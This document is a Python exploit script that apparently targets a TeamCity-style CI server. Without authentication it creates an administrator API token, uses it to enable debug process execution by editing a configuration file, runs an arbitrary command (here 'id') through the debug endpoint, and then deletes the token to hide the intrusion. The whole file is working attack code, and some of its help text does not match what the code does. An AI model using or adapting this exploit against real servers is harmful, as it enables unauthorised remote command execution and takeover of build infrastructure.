import requests
import xml.etree.ElementTree as ET
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8111', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port


# Set up target information
base_url = f"http://{host}:{port}"

def add_api_token():
    url = f"{base_url}/app/rest/users/id:1/tokens/RPC2"
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    response = requests.post(url, headers=headers)
    
    print(response)

    if response.status_code == 200:
        print("[+] Successfully added API token 'RPC2'.")
        return response.text
    else:
        print(f"[-] Failed to add API token. Status Code: {response.status_code}")
        return None

def parse_token(xml_response):
    try:
        root = ET.fromstring(xml_response)
        #print(root)
        token_value = root.get('value').strip()
        return token_value
    except Exception as e:
        print(f"[-] Error parsing XML response: {e}")
        return None

def enable_debug_mode(token):
    url = f"{base_url}/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true"
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": f"Bearer {token}"
    }
    
    response = requests.post(url, headers=headers)
    if response.status_code == 200:
        print("[+] Debug mode enabled.")
        return True
    else:
        print(f"[-] Failed to enable debug mode. Status Code: {response.status_code}")
        return False

def execute_command(command):
    url = f"{base_url}/app/rest/debug/processes?exePath={command}"
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Authorization": f"Bearer {token}"
    }
    
    response = requests.post(url, headers=headers)
    if response.status_code == 200:
        print(f"[+] Successfully executed command: {command}")
        print(response.text)
    else:
        print(f"[-] Failed to execute command. Status Code: {response.status_code}")

def delete_api_token():
    url = f"{base_url}/app/rest/users/id:1/tokens/RPC2"
    
    headers = {
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    response = requests.delete(url, headers=headers)

    if response.status_code == 204:
        print("[+] Successfully deleted API token 'RPC2'.")
    else:
        print(f"[-] Failed to delete API token. Status Code: {response.status_code}")

if __name__ == "__main__":
    # Step 1: Add API token
    xml_response = add_api_token()
    if xml_response:
        # Step 2: Parse the token from XML
        token = parse_token(xml_response)
        if token:
            # Step 3: Enable debug mode
            if enable_debug_mode(token):
                # Step 4: Execute arbitrary command
                execute_command("id")
                
                # Step 5: Delete the token
                delete_api_token()
